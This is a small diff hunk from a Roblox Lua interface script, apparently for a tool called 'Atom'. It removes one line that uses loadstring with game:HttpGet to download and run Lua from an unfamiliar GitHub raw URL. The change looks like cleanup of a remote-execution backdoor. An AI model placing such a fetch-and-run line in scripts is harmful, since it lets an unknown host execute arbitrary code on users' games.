@@ -3198,7 +3198,6 @@ local function SPVDE_fake_script() -- Atom.Status
 		Music:Stop()
 	end
 	
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/djasddjajw881323hidigdfsdfp/2f457hkd323atom/atom/Execution.lua"))()
 end
 coroutine.wrap(SPVDE_fake_script)()
 local function JGBEDE_fake_script() -- Button_14.ButtonManager 
